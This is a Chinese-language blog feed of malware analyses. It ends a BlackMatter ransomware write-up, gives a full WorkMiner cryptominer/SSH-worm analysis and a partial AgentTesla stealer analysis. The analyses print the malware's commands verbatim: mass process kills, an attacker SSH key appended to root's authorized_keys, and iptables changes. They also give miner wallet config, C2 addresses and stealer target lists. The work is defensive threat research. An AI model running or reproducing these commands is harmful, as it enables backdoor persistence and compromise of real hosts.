<p>当<code>Kill_Process_Flag</code>为<code>True</code>时，使用<code>NtQuerySystemInformation</code>检索进程列表，对比是否在杀死名单中，如果是，使用<code>NtOpenProcess</code>确认句柄，使用<code>NtTerminateProcess</code>杀死进程，进程列表如下：</p>
<pre><code>&quot;encsvc&quot;、&quot;thebat&quot;、&quot;mydesktopqos&quot;、&quot;xfssvccon&quot;、&quot;firefox&quot;、&quot;infopath&quot;、&quot;winword&quot;、&quot;steam&quot;、&quot;synctime&quot;、&quot;notepad&quot;、&quot;ocomm&quot;、&quot;onenote&quot;、&quot;mspub&quot;、&quot;thunderbird&quot;、&quot;agntsvc&quot;、&quot;sql&quot;、&quot;excel&quot;、&quot;powerpnt&quot;、&quot;outlook&quot;、&quot;wordpad&quot;、&quot;dbeng50&quot;、&quot;isqlplussvc&quot;、&quot;sqbcoreservice&quot;、&quot;oracle&quot;、&quot;ocautoupds&quot;、&quot;dbsnmp&quot;、&quot;msaccess&quot;、&quot;tbirdconfig&quot;、&quot;ocssd&quot;、&quot;mydesktopservice&quot;、&quot;visio&quot;
</code></pre><p><img src="/blackmatter_images/5616521163400.png" alt=""></p>
<h4 id="657-io多线程加密">6.5.7. I/O多线程加密</h4>
<p>创建用于处理<code>I/O</code>数据包的子线程，这些子线程使用<code>GetQueuedCompletionStatus</code>与<code>PostQueuedCompletionStatus</code>与主线程进行通信。接收到的数据包，都是需要处理的文件。</p>
<p><img src="/blackmatter_images/3954843145613.png" alt=""></p>
<p><strong>整个加密过程存在四个 case</strong></p>
<ol>
<li><code>case 0</code>：读取文件；</li>
</ol>
<p><img src="/blackmatter_images/1719746134911.png" alt=""></p>
<ol start="2">
<li><code>case 1</code>：加密和写入文件。加密采用了自定义的加密算法，待加密结束后，将文件重新写入磁盘；</li>
</ol>
<p><img src="/blackmatter_images/5614756143391.png" alt=""></p>
<p><img src="/blackmatter_images/3789249131162.png" alt=""></p>
<ol start="3">
<li><code>case 2</code>：写入文件页脚标识。当完成加密后，会在文件末端写入标识，标记该文件已被加密；</li>
</ol>
<p><img src="/blackmatter_images/485053131301.png" alt=""></p>
<ol start="4">
<li><code>case 3</code>：当加密完成并写入页脚后，调用<code>NtClose</code>关闭文件句柄，使用<code>RtlFreeHeap</code>释放缓冲区</li>
</ol>
<p><img src="/blackmatter_images/2986658148430.png" alt=""></p>
<h4 id="658-驱动器检索">6.5.8. 驱动器检索</h4>
<p>当<code>Drive_Flag</code>为<code>True</code>时，采用<code>FindFirstVolumeW</code>和<code>FindNextVolumeW</code>检索全部的卷，然后调用<code>GetVolumePathNamesForVolumeNameW</code>检索驱动器号和已安装文件夹路径的列表：</p>
<p><img src="/blackmatter_images/1439938191050.png" alt=""></p>
<p>当操作系统版本是<code>Windows 7</code>以前的版本时，将<code>bootmgr</code>挂载到最后一个驱动器后：</p>
<p><img src="/blackmatter_images/4987643209476.png" alt=""></p>
<h4 id="659-域内资源检索">6.5.9. 域内资源检索</h4>
<p>当<code>Network_Flag</code>为<code>True</code>时，将通过<code>DsGetDcNameW</code>获取域控制器信息，然后使用<code>DsGetDcOpenW</code>打开控制器，通过<code>DsGetDcNextW</code>枚举出所有的域控制器：</p>
<p><img src="/blackmatter_images/4952449217509.png" alt=""></p>
<p>然后采用<code>ADsEnumerateNext</code>来枚举域控制器内的<code>DNS</code>主机：</p>
<p><img src="/blackmatter_images/2959658206733.png" alt=""></p>
<p>然后使用<code>NetShareEnum</code>多线程寻找域内主机：</p>
<p><img src="/blackmatter_images/2985801230367.png" alt=""></p>
<p>剩下的就是目录过滤和加密了：</p>
<p><img src="/blackmatter_images/2315602227971.png" alt=""></p>
<h4 id="6510-检索文件并加密">6.5.10. 检索文件并加密</h4>
<p>当<code>Drive_Flag</code>为<code>True</code>时，使用<code>FindFirstVolumeW</code>和<code>FindNextVolumeW</code>获取所有卷的驱动器号和已安装文件夹路径的列表；扫描每个驱动器目录，在目录中放置赎金票据，并使用<code>FindFirstFileExW</code>和<code>FindNextFileW</code>枚举目录，避开所有名为<code>.</code>或<code>..</code>的文件或目录：</p>
<p><img src="/blackmatter_images/4150840180904.png" alt=""></p>
<p>在对文件进行加密时，首先会解除服务或进程对文件的占用：</p>
<p><img src="/blackmatter_images/5094041166456.png" alt=""></p>
<p>然后会检查文件是否已加密：</p>
<p><img src="/blackmatter_images/1359646182735.png" alt=""></p>
<p>将文件更名为带加密拓展名的文件：</p>
<p><img src="/blackmatter_images/3419454175780.png" alt=""></p>
<p>然后使用<code>CreateIoCompletionPort</code>向全局<code>I/O</code>注册文件句柄，让<code>I/O</code>子线程进行加密：</p>
<p><img src="/blackmatter_images/1081156172547.png" alt=""></p>
<p><strong>参考链接</strong></p>
<pre><code>RID 说明：https://docs.microsoft.com/zh-tw/dotnet/api/system.security.principal.windowsprincipal.isinrole?redirectedfrom=MSDN&amp;view=windowsdesktop-5.0#overloads
OSMajorVersion 与 OSMinorVersion 对照表：https://docs.microsoft.com/en-us/windows-hardware/drivers/install/inf-manufacturer-section
样本配置文件提取器：https://github.com/advanced-threat-research/DarkSide-Config-Extract
</code></pre>]]></content>
		</item>
		
		<item>
			<title>WorkMiner</title>
			<link>https://www.a1ee.cn/medium/workminer/</link>
			<pubDate>Wed, 01 Sep 2021 08:59:16 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/workminer/</guid>
			<description>WorkMiner样本分析 样本信息 使用DIE查看样本情况： 脱壳 使用upx3.93脱壳失败，提示： upx: work64: CantUnpackException: p_info corrupted 使用文本标记其查看二进制文件，发现</description>
			<content type="html"><![CDATA[<h1 id="workminer样本分析">WorkMiner样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>使用<code>DIE</code>查看样本情况：</p>
<p><img src="/workminer_images/2436651160000.png" alt=""></p>
<h2 id="脱壳">脱壳</h2>
<p>使用<code>upx3.93</code>脱壳失败，提示：</p>
<pre><code>upx: work64: CantUnpackException: p_info corrupted
</code></pre><p>使用文本标记其查看二进制文件，发现<code>p_info</code>被修改了：</p>
<p><img src="/workminer_images/2446734175295.png" alt=""></p>
<p>从末尾找到文件大小：</p>
<p><img src="/workminer_images/1805533162309.png" alt=""></p>
<p>修复<code>p_info</code>即可成功脱壳：</p>
<p><img src="/workminer_images/367734177793.png" alt=""></p>
<h2 id="去除混淆">去除混淆</h2>
<p>脱壳后，使用<code>IDA</code>加载，查找字符串，发现是<code>golang</code>程序：</p>
<p><img src="/workminer_images/5157232166555.png" alt=""></p>
<p>使用<code>IDAGolangHelper</code>解除混淆可正常分析。</p>
<h2 id="功能分析">功能分析</h2>
<h3 id="main_killminer">main_killminer</h3>
<p>执行命令终止其他挖矿进程</p>
<p><img src="/workminer_images/980700198976.png" alt=""></p>
<p>命令列表如下：</p>
<pre><code>ps -ef | grep ddg | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep tcp: | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep x86_ | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep miner | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep pool. | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep monero | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep prohash | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep stratum | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep .daemond | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep Circle_MI | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep kworker34 | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep cryptonight | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep /tmp/thisxxs | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep /usr/bin/.sshd | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep /opt/yilu/mservice | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep /opt/yilu/work/xig/xig | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep /usr/bin/bsd-port/getty | grep -v grep | awk '{print $2}' | xargs kill -9
</code></pre><h3 id="文件释放">文件释放</h3>
<p>检查是否存在环境变量<code>TMPDIR</code>，切换到<code>/tmp</code>目录下执行<code>killall xmr</code>命令，将系统命令：<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>：</p>
<p><img src="/workminer_images/3871249213222.png" alt=""></p>
<p>生成配置文件：<code>/tmp/config.json</code></p>
<p><img src="/workminer_images/4658020187658.png" alt=""></p>
<p>配置文件内容如下（其中包含了挖矿钱包）：</p>
<pre><code>{
	&quot;api&quot;: {
		&quot;id&quot;: null,
		&quot;worker-id&quot;: null
	},
	&quot;http&quot;: {
		&quot;enabled&quot;: false,
		&quot;host&quot;: &quot;127001&quot;,
		&quot;port&quot;: 0,
		&quot;access-token&quot;: null,
		&quot;restricted&quot;: true
	},
	&quot;autosave&quot;: true,
	&quot;background&quot;: true,
	&quot;colors&quot;: true,
	&quot;title&quot;: true,
	&quot;randomx&quot;: {
		&quot;init&quot;: -1,
		&quot;mode&quot;: &quot;auto&quot;,
		&quot;1gb-pages&quot;: false,
		&quot;rdmsr&quot;: true,
		&quot;wrmsr&quot;: false,
		&quot;numa&quot;: true
	},
	&quot;cpu&quot;: {
		&quot;enabled&quot;: true,
		&quot;huge-pages&quot;: true,
		&quot;hw-aes&quot;: null,
		&quot;priority&quot;: null,
		&quot;memory-pool&quot;: false,
		&quot;yield&quot;: true,
		&quot;argon2-impl&quot;: null,
		&quot;astrobwt-max-size&quot;: 550,
		&quot;astrobwt-avx2&quot;: false,
		&quot;argon2&quot;: [0],
		&quot;astrobwt&quot;: [-1],
		&quot;cn&quot;: [
			[1, 0]
		],
		&quot;rx&quot;: [0],
		&quot;rx/wow&quot;: [0],
		&quot;cn/0&quot;: false,
		&quot;rx/arq&quot;: &quot;rx/wow&quot;,
		&quot;rx/keva&quot;: &quot;rx/wow&quot;
	},
	&quot;donate-level&quot;: 0,
	&quot;donate-over-proxy&quot;: 1,
	&quot;log-file&quot;: null,
	&quot;pools&quot;: [{
		&quot;algo&quot;: null,
		&quot;coin&quot;: null,
		&quot;url&quot;: &quot;xmrcrypto-poolfr:6666&quot;,
		&quot;user&quot;: &quot;47BD6QNfkWf8ZMQSdqp2tY1AdG8ofsEPf4mcDp1YB4AX32hUjoLjuDaNrYzXk7cQcoPBzAuQrmQTgNgpo6XPqSBLCnfsjaV&quot;,
		&quot;pass&quot;: &quot;x&quot;,
		&quot;rig-id&quot;: null,
		&quot;nicehash&quot;: false,
		&quot;keepalive&quot;: false,
		&quot;enabled&quot;: true,
		&quot;tls&quot;: false,
		&quot;tls-fingerprint&quot;: null,
		&quot;daemon&quot;: false,
		&quot;socks5&quot;: null,
		&quot;self-select&quot;: null
	}],
	&quot;print-time&quot;: 60,
	&quot;retries&quot;: 5,
	&quot;retry-pause&quot;: 5,
	&quot;syslog&quot;: false,
	&quot;user-agent&quot;: null,
	&quot;verbose&quot;: 0,
	&quot;watch&quot;: true
}
</code></pre><p>将<code>elf</code>格式的二进制文件写入到<code>/tmp/xmr</code>中：</p>
<p><img src="/workminer_images/2204351171322.png" alt=""></p>
<p>添加可执行权限：</p>
<p><img src="/workminer_images/2258155195435.png" alt=""></p>
<p>生成<code>/tmp/secure.sh</code>脚本并添加可执行权限：</p>
<p><img src="/workminer_images/5877555184733.png" alt=""></p>
<p>脚本内容如下：</p>
<pre><code>#!/bin/bash

LIMIT=8
while true ; do
    TIME=$(date '+%b %e %H')     #example: Apr 11 11
    BLOCK_IP=$(grep &quot;$TIME&quot; /var/log/secure|grep Failed|awk '{print $(NF-3)}'|sort|uniq -c|awk '$1&gt;&quot;$LIMIT&quot;{print $1&quot;:&quot;$2}')
    for i in $BLOCK_IP
    do
        IP=$(echo $i|awk -F: '{print $2}')
        grep $IP /etc/hosts.deny &gt; /dev/null
        if [ $? -gt 0 ];
        then
            echo &quot;sshd:$IP&quot; &gt;&gt; /etc/hosts.deny
        fi
    done
    sleep 60
done
</code></pre><p>生成<code>/tmp/auth.sh</code>脚本并添加可执行权限：</p>
<p><img src="/workminer_images/141357180984.png" alt=""></p>
<p>脚本内容如下：</p>
<pre><code>#!/bin/bash

LIMIT=8
while true ; do
    TIME=$(date '+%b %e %H')     #example: Apr 11 11
    BLOCK_IP=$(grep &quot;$TIME&quot; /var/log/auth.log|grep Failed|awk '{print $(NF-3)}'|sort|uniq -c|awk '$1&gt;&quot;$LIMIT&quot;{print $1&quot;:&quot;$2}')
    for i in $BLOCK_IP
    do
        IP=$(echo $i|awk -F: '{print $2}')
        grep $IP /etc/hosts.deny &gt; /dev/null
        if [ $? -gt 0 ];
        then
            echo &quot;sshd:$IP&quot; &gt;&gt; /etc/hosts.deny
        fi
    done
    sleep 60
done
</code></pre><p>检查是否存在<code>/usr/.work</code>，不存在则创建：</p>
<p><img src="/workminer_images/5425616185658.png" alt=""></p>
<p>将当前路径（<code>/tmp</code>）下的文件拷贝到<code>/usr/.work</code>中去</p>
<p><img src="/workminer_images/2576720186267.png" alt=""></p>
<h3 id="main_add_crontab_job">main_add_crontab_job</h3>
<p>检查是否存在<code>/root/.ssh</code>，不存在则创建，然后设置权限为<code>700</code>：</p>
<p><img src="/workminer_images/3347128191123.png" alt=""></p>
<p>生成<code>/root/.ssh/authorized_keys</code>，设置权限为<code>600</code>，并使用<code>echo</code>写入内容：</p>
<p><img src="/workminer_images/5574831203213.png" alt=""></p>
<p>写入公钥命令为：</p>
<pre><code>echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc3BlbiQaznPT8TScrs9YIzmrpI9Lpa4LtCjB5z0LuQ4o6XwvzomxAixn2F1jaUl175Cxcg3PmUsPOLE+WeWicKqL2YZ46SotjZgnS6JjXpuZVi7V0DSiXu0itlwWDC9m8huBvUBSIsDCsgb9OeG6rlrCyZgTW+qZciK+KZ8rwlFp3CFyxoF2122ueOnl5pAUCy1iHqGun03dMdUxA1d3KnxSZ3NQrYiH69dc8/YhV4SriOW9psc0pv9KeBLF0OXHtEAdbnSlwfk2uTjjBMK0nDidl7wS52Ygi/H4+P+4EXkSzf4Jj4/L6P3c5rLC3/l3RFdo1T7EQ8fH6NsTYJNZ7 root@u911&quot; &gt;&gt; /root/.ssh/authorized_keys
</code></pre><p>检测是否存在以下文件：</p>
<pre><code>/etc/rc.d/rc.local
/etc/rc.local
/etc/rc.conf
/etc/crontab
</code></pre><p><img src="/workminer_images/1157936208252.png" alt=""></p>
<p>检测是否存在以下文件：</p>
<pre><code>/var/spool/cron/root
/var/spool/cron/crontabs
</code></pre><p><img src="/workminer_images/1021943209547.png" alt=""></p>
<p>附加文件：</p>
<pre><code>/var/spool/cron/root
/var/spool/cron/crontabs/root
</code></pre><p><img src="/workminer_images/4794654210549.png" alt=""></p>
<h3 id="修改防火墙规则">修改防火墙规则</h3>
<p>执行命令，修改防火墙规则：</p>
<p><img src="/workminer_images/5133802220726.png" alt=""></p>
<p>修改命令如下：</p>
<pre><code>iptables -I INPUT  -p tcp --dport
iptables -I OUTPUT -p tcp --sport
iptables -I POSTROUTING -t nat -p tcp --sport
iptables -I PREROUTING  -t nat -p tcp --dport
iptables -I INPUT  -p udp --dport %d -j ACCEPT
iptables -I OUTPUT -p udp --sport %d -j ACCEPT
iptables -I PREROUTING  -t nat -p udp --dport %d -j ACCEPT
iptables -I POSTROUTING -t nat -p udp --sport %d -j ACCEPT
</code></pre><h3 id="ssh蠕虫攻击">ssh蠕虫攻击</h3>
<p>在修改完防火墙规则后，执行<code>__home_haha_work_go_sshworm_work_Crackssh</code>函数，对<code>ssh</code>服务进行<code>Crack</code>：</p>
<p><img src="/workminer_images/2778508206278.png" alt=""></p>
<p>进入函数中首先检查当前目录（<code>/tmp</code>）下是否存在<code>./user.list</code>：</p>
<p><img src="/workminer_images/4941630160942.png" alt=""></p>
<p>如果存在且不为空，则加载内容至内存中；如果为空，则将<code>root</code>加载到内存中，当作<code>userlist</code>使用：</p>
<p><img src="/workminer_images/3213532179368.png" alt=""></p>
<p>然后检查当前目录（<code>/tmp</code>）下是否存在<code>./pass.list</code>：</p>
<p><img src="/workminer_images/2385533167235.png" alt=""></p>
<p>如果存在且不为空，则加载内容至内存中；如果为空，则将<code>123456</code>加载到内存中，当作<code>passlist</code>使用：</p>
<p><img src="/workminer_images/2635134187401.png" alt=""></p>
<p>接着新建一个<code>goroutine</code>池，用于多线程爆破：
<img src="/workminer_images/715138180070.png" alt=""></p>
<p>然后收集用于爆破的IP地址（包括内网、公网、已知主机的IP）：</p>
<p><img src="/workminer_images/137540176625.png" alt=""></p>
<p>如果收集到IP地址，则检查本地（<code>/.ssh/id_rsa</code>）是否存在公钥，如果存在公钥则在<code>goroutine</code>池中进行公钥登录尝试：</p>
<p><img src="/workminer_images/188745190259.png" alt=""></p>
<p>如果不存在公钥，则在<code>goroutine</code>池中进行默认登录尝试：</p>
<p><img src="/workminer_images/5561547187863.png" alt=""></p>
<p>如果未收集用于爆破的IP地址，则会获取<code>lanip</code>，并删除重复值：</p>
<p><img src="/workminer_images/2551955185365.png" alt=""></p>
<p>如果获取失败，则随机生成IP并判断是否是lanip，最后都将统一在<code>goroutine</code>池中进行默认登录尝试：</p>
<p><img src="/workminer_images/1287058166606.png" alt=""></p>
<p>在使用公钥登录（<code>__home_haha_work_go_sshworm_work_Pkeylogin</code>）或默认登录（<code>__home_haha_work_go_sshworm_work_LoginSsh</code>）成功后，都将调用<code>__home_haha_work_go_sshworm_work_scp_proc</code>函数，该函数会首先创建<code>/usr/.work</code>：</p>
<p><img src="/workminer_images/3321348090943.png" alt=""></p>
<p>接着创建<code>/tmp/.work</code>：</p>
<p><img src="/workminer_images/4934150109369.png" alt=""></p>
<p>添加权限并执行<code>work32</code>：</p>
<p><img src="/workminer_images/4232507107236.png" alt=""></p>
<p>等待2s后继续，添加权限并执行<code>work64</code>：</p>
<p><img src="/workminer_images/5347708127402.png" alt=""></p>
<p>整个蠕虫攻击形成闭环。</p>
<h3 id="main__cfunc_getconf">main__Cfunc_GetConf</h3>
<p>在执行完<code>ssh蠕虫攻击</code>后，最后调用<code>main__Cfunc_GetConf</code></p>
<p><img src="/workminer_images/3660828202700.png" alt=""></p>
<p>层层深入后发现恶意外链：</p>
<p><img src="/workminer_images/1768926215602.png" alt=""></p>
<p>查看<code>off_D8D080</code>地址处的字符串：</p>
<p><img src="/workminer_images/2444401130071.png" alt=""></p>
<p>上方存在循环，也就是说<code>[rbp+var_B0]</code>依次递增，通过循环可依次去除链接进行访问，查看循环出发点：</p>
<p><img src="/workminer_images/868405126626.png" alt=""></p>
<p>上一个函数应该就是外联函数（<code>sub_7341E0</code>）：</p>
<p><img src="/workminer_images/1618016140260.png" alt=""></p>
<p>进入其中，向下寻找，逐步定位函数<code>sub_73BAD0</code>为<code>socket</code>请求主函数：</p>
<p><img src="/workminer_images/2578817137864.png" alt=""></p>
<p>进入其中可以看到明显的<code>socket</code>、<code>bind</code>函数：</p>
<p><img src="/workminer_images/3633214122380.png" alt=""></p>
<p>外联过程分析结束，链接分析如下：</p>
<pre><code>P2P节点如下：
router.bittorrent.com:6881
bttracker.debian.org:6881
router.utorrent.com:6881
dht.transmissionbt.com:6881

恶意CC如下：
212.129.33.59:6881
82.221.103.244:6881
130.239.18.159:6881
87.98.162.88:6881
</code></pre><h2 id="总结">总结</h2>
<p>主机感染木马后执行流程大致如下：</p>
<ol>
<li>杀掉本地已有的挖矿进程；</li>
<li>切换至<code>/tmp</code>路径，杀死<code>xmr</code>进程；</li>
<li>将系统命令<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>；</li>
<li>生成挖矿程序的配置文件<code>config.json</code>；</li>
<li>将挖矿程序写入到<code>xmr</code>中并执行；</li>
<li>生成<code>secure.sh</code>、<code>auth.sh</code>脚本并执行；</li>
<li>将<code>/tmp</code>下的文件拷贝到<code>/usr/.work</code>中去；</li>
<li>向<code>/root/.ssh/authorized_keys</code>中写入公钥，方便攻击者连接；</li>
<li>检测计划任务文件并添加计划任务；</li>
<li>修改防火墙规则，方便出站；</li>
<li>使用ssh蠕虫攻击其它主机；</li>
<li>访问外部链接；</li>
</ol>
<h2 id="建议">建议</h2>
<p>建议将上述的恶意CC及矿池地址（<code>xmr.crypto-pool.fr</code>,IP:<code>163.172.226.137</code>）添加至防火墙出站规则；</p>
<p>建议修改SSH服务端口，设置SSH服务基线，禁用Root用户登录、杜绝弱口令及设置错误限制次数；</p>
]]></content>
		</item>
		
		<item>
			<title>AgentTesla</title>
			<link>https://www.a1ee.cn/medium/agenttesla/</link>
			<pubDate>Thu, 24 Jun 2021 15:22:11 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/agenttesla/</guid>
			<description>AgentTesla窃密木马样本分析 1. 简介 Agent Tesla 是一种密码窃取间谍软件，自 2014 年以来一直存在。攻击者可以使用该恶意软件来监视受害者，使他们能够查</description>
			<content type="html"><![CDATA[<h1 id="agenttesla窃密木马样本分析">AgentTesla窃密木马样本分析</h1>
<h2 id="1-简介">1. 简介</h2>
<p>Agent Tesla 是一种密码窃取间谍软件，自 2014 年以来一直存在。攻击者可以使用该恶意软件来监视受害者，使他们能够查看在支持的程序和网络浏览器中输入的所有内容。</p>
<p>Agent Tesla 病毒在其自己的网站上进行营销和销售，该网站错误地声称该程序是为个人使用而创建的合法键盘记录器，因此在黑客社区中非常流行。不仅仅是因为它的易用性和技术支持，可以在攻击者出售此恶意软件的“官方”网站以及专用的 Discord 服务器上找到。尽管声称该软件是合法的，但售卖人员还是会就非法使用该病毒提出建议。</p>
<h2 id="2-样本详情">2. 样本详情</h2>
<p>本次分析的样本哈希如下：</p>
<pre><code>MD5：af98b88c0b5dc353fbe536bd6fb8c4ec
SHA256：cc262fd3fa1f646aff2f5bcdea33beca5ed081260028b8604d5f714dd23c03ac
</code></pre><p>可以从<a href="https://app.any.run/tasks/84fc78ab-2695-4a5a-9a89-45f2497c38de/">any.run沙箱</a>查看到样本的行为及下载样本。</p>
<p>将样本用PEStudio打开，可以看到<code>Mircrosoft</code>将其标记为<code>AgentTesla</code>：</p>
<p><img src="/tesla_images/1832029179083.png" alt=""></p>
<p><code>libraries</code>标签可以看出这是一个.NET程序，且<code>strings</code>标签内字符串数量有点多，<code>version</code>标签中可以获取到样本的原始文件名及哈希情况：</p>
<p><img src="/tesla_images/3350431166950.png" alt=""></p>
<h2 id="3-样本分析">3. 样本分析</h2>
<p>使用<code>dnSpy</code>加载样本，向下观察代码，可以在<code>Helper</code>类中找到<code>Gzip</code>其中存放了约<code>10000</code>行数据，向下阅读代码，是<code>C#</code>中常用的解压缩函数<code>GZipStream</code>：</p>
<ol>
<li><img src="/tesla_images/5397454179785.png" alt=""></li>
</ol>
<h3 id="31-样本释放">3.1. 样本释放</h3>
<p>在<code>retrun result</code>处下断，得到了解压内存存放的内存地址<code>0x00027800</code>，在内存窗口中查看，可以明显看出是<code>PE</code>文件结构：</p>
<p><img src="/tesla_images/1477230100659.png" alt=""></p>
<p>使用<code>dnSpy</code>自带的保存功能，将该地址处存放的数据保存到本地，再使用<code>PEStudio</code>查看，这是一个名为：<code>Ihinax.dll</code>的<code>.NET</code>文件。</p>
<p><img src="/tesla_images/2901937119085.png" alt=""></p>
<p><code>Ihinax.dll</code>函数名经过了混淆，经过了长时间的阅读，在<code>LVU3WCMrRsWDmqar8f</code>空间下的<code>Su370LNVnsglWDN9lR</code>类的第311行，找到了<code>gzipStream</code>，下断点执行到此处，<code>array2</code>中所存放的内容是<code>PE</code>文件格式的内容。</p>
<p><img src="/tesla_images/2984344106952.png" alt=""></p>
<p>保存下来，使用<code>PEStudio</code>查看：</p>
<p><img src="/tesla_images/2175446127118.png" alt=""></p>
<p>这里推荐使用互联网工具对文件进行解压。<a href="https://www.unpac.me/results/01c9a92b-100b-4d9d-93cb-56a9029a0026#/">UnpacMe解压</a>结果如下：</p>
<p><img src="/tesla_images/1678414182094.png" alt=""></p>
<p>将手动解压与<code>UnpacMe</code>解压的内容进行<code>SHA256</code>比较，并无差别：</p>
<p><img src="/tesla_images/4437048119787.png" alt=""></p>
<h3 id="32-样本解码">3.2. 样本解码</h3>
<p>使用<code>dnSpy</code>加载最终的恶意程序，进入主函数可以看到一些奇怪的函数，<code>GetEnvironmentVariable</code>函数是用于获取系统变量的，参数却是函数<code>97085277-F30F-47FA-9C3D-82DA9E6730B4.L()</code>。</p>
<p><img src="/tesla_images/4581331127121.png" alt=""></p>
<p>进入其中可以看到类中有个类似于解密的东西，然后下方的方法进行方法传递：</p>
<p><img src="/tesla_images/3794127100662.png" alt=""></p>
<p>解密字符集：</p>
<p><img src="/tesla_images/3522028119088.png" alt=""></p>
<p><img src="/tesla_images/3441329106955.png" alt=""></p>
<p>这里可以使用<code>de4dot</code>对其进行动态解密，作者在<code>readme</code>中进行了如下说明：</p>
<p><img src="/tesla_images/1697150189976.png" alt=""></p>
<p><code>de4dot</code>对<code>--strtyp</code>参数的说明如下：</p>
<pre><code>String decrypter types
  none             Don't decrypt strings
  default          Use default string decrypter type (usually static)
  static           Use static string decrypter if available
  delegate         Use a delegate to call the real string decrypter
  emulate          Call real string decrypter and emulate certain instructions
</code></pre><p>这里选取了<code>emulate</code>进行尝试，但是作者显然并不想我们这么容易就解除了混淆，加密字符串居然有<code>6000535h - 600022Bh = 30Ah</code>处！</p>
<p><img src="/tesla_images/440434116345.png" alt=""></p>
<p>所以我简单生成了一个粗糙的bat：</p>
<pre><code>de4dot.exe dump2.bin --strtyp emulate --strtok 600022B
rename dump2-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022C
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022D
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022E
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022F
del dump3.bin
rename dump3-cleaned.bin dump3.bin
……
……
……
de4dot.exe dump3.bin --strtyp emulate --strtok 6000533
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 6000534
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 6000535
del dump3.bin
rename dump3-cleaned.bin dump3.bin
</code></pre><p>在经过了大约二十分钟后，我获得了一个解密后的程序：</p>
<p><img src="/tesla_images/115833119790.png" alt=""></p>
<h3 id="33-代码阅读">3.3. 代码阅读</h3>
<p>对于<code>C#</code>程序，既然字符串已经还原了，个人习惯是先阅读代码，然后就会有如下的这些发现。</p>
<h4 id="331-设置开机自启">3.3.1. 设置开机自启</h4>
<p><img src="/tesla_images/3034945140663.png" alt=""></p>
<h4 id="332-获取本机公网ip">3.3.2. 获取本机公网ip</h4>
<p><img src="/tesla_images/18847159089.png" alt=""></p>
<h4 id="333-下载文件">3.3.3. 下载文件</h4>
<p><img src="/tesla_images/1613451167122.png" alt=""></p>
<h4 id="334-获取系统信息">3.3.4. 获取系统信息</h4>
<p><img src="/tesla_images/2452553159791.png" alt=""></p>
<h4 id="335-截取屏幕">3.3.5. 截取屏幕</h4>
<p><img src="/tesla_images/5994156156346.png" alt=""></p>
<h4 id="336-ftp服务操作">3.3.6. FTP服务操作</h4>
<p><img src="/tesla_images/764505162100.png" alt=""></p>
<h4 id="337-浏览器用户数据窃取">3.3.7. 浏览器用户数据窃取</h4>
<p><img src="/tesla_images/3854308179980.png" alt=""></p>
<h4 id="338-smtp请求配置">3.3.8. SMTP请求配置</h4>
<p><img src="/tesla_images/2423011177584.png" alt=""></p>
<h4 id="339-键盘记录">3.3.9. 键盘记录</h4>
<p><img src="/tesla_images/4989936183004.png" alt=""></p>
<h4 id="3310-socket通信">3.3.10. SOCKET通信</h4>
<p><img src="/tesla_images/630324175086.png" alt=""></p>
<h4 id="3311-数据上传">3.3.11. 数据上传</h4>
<p><img src="/tesla_images/5323027156327.png" alt=""></p>
<h4 id="3312-des加密">3.3.12. DES加密</h4>
<p><img src="/tesla_images/4082929178767.png" alt=""></p>
<h4 id="3313-判断操作系统版本">3.3.13. 判断操作系统版本</h4>
<p><img src="/tesla_images/1222354160583.png" alt=""></p>
<h4 id="3314-特殊软件的凭证窃取">3.3.14. 特殊软件的凭证窃取</h4>
<p>特殊软件的凭证窃取（下图是Edge浏览器的窃取函数段）</p>
<p><img src="/tesla_images/3238651188043.png" alt=""></p>
<p>从Edge凭证窃取函数可以看出，窃取函数存在以下特征：</p>
<pre><code>UserName =
Password =
Browser = &quot;&quot;
</code></pre><p>检索全部代码，反复确认后，发现窃取目标包含以下对象：</p>
<pre><code>Browser = &quot;IE/Edge&quot;
Browser = &quot;Edge Chromium&quot;
Browser = &quot;QQ Browser&quot;
Browser = &quot;incredimail&quot;
x.Browser = &quot;Eudora&quot;
Browser = &quot;Falkon Browser&quot;
Browser = &quot;Falkon Browser&quot;
Browser = &quot;ClawsMail&quot;
Browser = &quot;Flock Browser&quot;
Browser = &quot;DynDNS&quot;
x.Browser = &quot;Psi/Psi+&quot;
x.Browser = &quot;Open VPN&quot;
x.Browser = &quot;FileZilla&quot;
Browser = &quot;WinSCP&quot;
Browser = &quot;FlashFXP&quot;
x.Browser = &quot;FTP Navigator&quot;
x.Browser = &quot;JDownloader&quot;
Browser = &quot;Paltalk&quot;
Browser = &quot;Pidgin&quot;
Browser = &quot;SmartFTP&quot;
x.Browser = &quot;WS_FTP&quot;
